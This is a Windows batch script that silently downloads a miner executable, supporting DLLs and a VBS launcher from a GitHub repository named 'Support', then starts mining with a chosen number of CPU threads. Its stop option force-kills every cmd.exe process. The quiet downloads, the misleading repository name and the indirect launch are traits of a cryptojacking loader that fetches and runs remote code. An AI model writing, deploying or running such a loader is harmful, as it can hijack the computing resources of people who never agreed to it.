@set "default_threads=2"

@echo off
if not exist data mkdir data
cd data
if not exist console.bat curl.exe -o "console.bat" "https://github.com/Kotsasmin/Support/raw/main/data/console.bat" -L -s
if not exist OpenCL.dll curl.exe -o "OpenCL.dll" "https://github.com/Kotsasmin/Support/blob/main/data/OpenCL.dll?raw=true" -L -s
if not exist miner.exe curl.exe -o "miner.exe" "https://github.com/Kotsasmin/Support/blob/main/data/miner.exe?raw=true" -L -s
if not exist msvcp140.dll curl.exe -o "msvcp140.dll" "https://github.com/Kotsasmin/Support/blob/main/data/msvcp140.dll?raw=true" -L -s
if not exist nvrtc-builtins64_92.dll curl.exe -o "nvrtc-builtins64_92.dll" "https://github.com/Kotsasmin/Support/blob/main/data/nvrtc-builtins64_92.dll?raw=true" -L -s
if not exist nvrtc64_92.dll curl.exe -o "nvrtc64_92.dll" "https://github.com/Kotsasmin/Support/blob/main/data/nvrtc64_92.dll?raw=true" -L -s
if not exist vcruntime140.dll curl.exe -o "vcruntime140.dll" "https://github.com/Kotsasmin/Support/blob/main/data/vcruntime140.dll?raw=true" -L -s
if not exist start.vbs curl.exe -o "start.vbs" "https://github.com/Kotsasmin/Support/raw/main/data/start.vbs" -L -s
IF "%1"=="" goto:EOF
IF /I "%1"=="-start" goto start
IF /I "%1"=="-stop" goto stop
goto:EOF

:start
IF "%2"=="" set "CPU=1"
SET "CPU=%2"
(
echo %CPU%
)>data
start start.vbs
timeout 1 /nobreak >nul
echo.
echo Now mining!^!
echo Use: "-stop" to stop mining...
echo.
goto:EOF

:stop
taskkill /F /IM miner.exe >nul
taskkill /F /IM cmd.exe >nul
goto:EOF

:open
echo Not argument detected...
set "CPU=%default_threads%"
echo Using %CPU% core(s)...
(
echo %CPU%
)>data
start start.vbs
timeout 1 /nobreak >nul
echo Now mining!^!
echo Use: "-stop" to stop mining...
echo.
pause
exit
